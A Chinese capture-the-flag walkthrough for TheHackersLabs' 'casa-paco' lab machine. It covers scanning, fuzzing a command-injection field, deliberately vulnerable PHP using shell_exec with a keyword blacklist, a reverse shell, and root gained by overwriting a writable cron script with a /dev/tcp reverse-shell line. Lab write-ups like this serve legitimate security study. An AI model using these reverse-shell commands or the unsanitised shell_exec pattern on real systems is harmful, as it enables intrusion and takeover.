# thl_casa-paco

# 0.简介

**靶机**：[thehackerslabs - casa-paco](https://thehackerslabs.com/casa-paco/)
**难度**：初学者
**目标 IP**：192.168.205.137
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST
Nmap scan report for 192.168.205.137
Host is up (0.00084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370)

把域名加入`hosts`

![image](https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c)

是个点餐的网站，你按照它的提示一直点到下单页，你发现`Plato`可以**执行命令**，但是有**限制**，连`ls`都无法执行,并且**无法绕过**，爆破一下可执行命令

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u "http://casapaco.thl/llevar.php" -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d "name=a&dish=FUZZ" --hw 89,75
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://casapaco.thl/llevar.php
Total requests: 475254

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================

000000023:   200        32 L     109 W      1276 Ch     "w"                                                                
000000110:   200        36 L     126 W      1478 Ch     "df"                                                               
000000125:   200        33 L     95 W       1184 Ch     "du"                                                               
000000238:   200        31 L     92 W       1202 Ch     "id"                                                               
000000435:   200        50 L     170 W      1814 Ch     "ps"                                                               
000000394:   200        31 L     90 W       1156 Ch     "od"                                                               
000000513:   200        70 L     390 W      5108 Ch     "ss"                                                               
000000601:   200        31 L     93 W       1172 Ch     "wc"                                                               
000000581:   200        32 L     173 W      3792 Ch     "vi"                                                               
000001112:   200        59 L     265 W      2439 Ch     "apt"                                                              
000001160:   200        34 L     110 W      1476 Ch     "arp"                                                              
000002956:   200        31 L     95 W       1215 Ch     "dir"  
（省略）
```

发现可以执行`dir`

![image](https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a)

当你`dir`，你就会发现有一个叫`llevar1.php`的页面（爆破不出来，只可以这样看），你可以使用`od`工具查看他文本

![image](https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68)

我直接放**可读版本**了，想看原版的，自己执行一下

```bash
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Casa Paco - Para Llevar</title>
    <link rel="stylesheet" href="static/styles.css">
</head>
<body>
    <header>
        <h1>Casa Paco - Pedido para Llevar</h1>
    </header>

    <main>
        <h2>Haz tu pedido para llevar</h2>
        <form action="llevar.php" method="POST" class="order-form">
            <label for="name">Nombre:</label>
            <input type="text" id="name" name="name" placeholder="Tu nombre" required><br>
          
            <label for="dish">Plato:</label>
            <input type="text" id="dish" name="dish" placeholder="Ejemplo: Pizza" required><br>
          
            <button type="submit" class="btn">Enviar Pedido</button>
        </form>

        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $name = htmlspecialchars($_POST["name"]); // Sanitizamos para evitar errores visuales
            $dish = $_POST["dish"]; // Intencionalmente sin sanitizar para la vulnerabilidad

            // Comando vulnerable
            $output = shell_exec("$dish");

            echo '<section class="confirmation">';
            echo '<h3>Pedido confirmado</h3>';
            echo "<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> está listo para llevar.</p>";
            echo '<h3>Salida del Comando:</h3>';
            echo "<pre>$output</pre>";
            echo '</section>';
        }
        ?>
    </main>

    <footer>
        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>
    </footer>
</body>
</html>
```

实现的和`llevar.php`一样，但是他没有**限制**，但是你不**锁死**这个网页，他就会把你的命令交给`llevar.php`执行，就寄寄，下面是`llevar.php`的代码

```bash
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Casa Paco - Pedido para Llevar</title>
    <link rel="stylesheet" href="static/styles.css">
</head>
<body>
    <header>
        <h1>Casa Paco - Pedido para Llevar</h1>
    </header>

    <main>
        <h2>Haz tu pedido para llevar</h2>
        <form action="llevar.php" method="POST" class="order-form">
            <label for="name">Nombre:</label>
            <input type="text" id="name" name="name" placeholder="Tu nombre" required><br>

            <label for="dish">Plato:</label>
            <input type="text" id="dish" name="dish" placeholder="Ejemplo: Cocido" required><br>

            <button type="submit" class="btn">Enviar Pedido</button>
        </form>
    </main>

    <?php
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        $name = htmlspecialchars($_POST["name"]);
        $dish = $_POST["dish"];

        // Filtrar comandos potencialmente peligrosos
        $blacklist_pattern = '/\b(whoami|ls|pwd|cat|sh|bash)\b/i';
        if (preg_match($blacklist_pattern, $dish)) {
            die('<p style="color: red;">Error: Pedido comprometido.</p>');
        }

        // Permitir solo caracteres válidos
        $allowed_pattern = '/^[a-zA-Z0-9\s\-_\.]+$/';
        if (!preg_match($allowed_pattern, $dish)) {
            die('<p style="color: red;">Error: Pedido contiene caracteres no permitidos.</p>');
        }

        // Ejecutar comando (no debe ser usado en un entorno de producción sin validaciones más estrictas)
        $output = shell_exec($dish);
        echo '<section class="confirmation">';
        echo '<h3>Pedido confirmado</h3>';
        echo "<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> estará listo para llevar.</p>";
        echo "<h3>Salida del Comando:</h3>";
        echo "<pre>$output</pre>";
        echo '</section>';
    }
    ?>
  
    <footer>
        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>
    </footer>
</body>
</html>

```

那就简单了我们锁死`llevar1.php`提交命令就好了

![image](https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06)

要进行**base64绕过**，不然执行不了

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                  
listening on [any] 8888 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002
bash: cannot set terminal process group (534): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Thehackerslabs-CasaPaco:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/
www-data@Thehackerslabs-CasaPaco:/home$ ls -la
total 12
drwxr-xr-x  3 root        root        4096 Jan 14 16:52 .
drwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..
drwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente
www-data@Thehackerslabs-CasaPaco:/home$ cd pacogerente/
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al
total 36
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 .
drwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..
lrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -> /dev/null
-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local
-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh
-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt
-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
#!/bin/bash

# Generar un log de actividad
echo "Ejecutado por cron el: $(date)" >> /home/pacogerente/log.txt

```

写个脚本覆盖掉`fabada.sh`就行了（不要问我为什么不看`pspy`，我看它长的都像定时任务☝( ◠‿◠ )☝）

```bash
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1' > fabada.
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1
```

等一会，它定时挺快的

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8889
listening on [any] 8889 ...
iconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802
bash: no se puede establecer el grupo de proceso de terminal (4096): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@Thehackerslabs-CasaPaco:~# d
id
uid=0(root) gid=0(root) grupos=0(root)

```

下班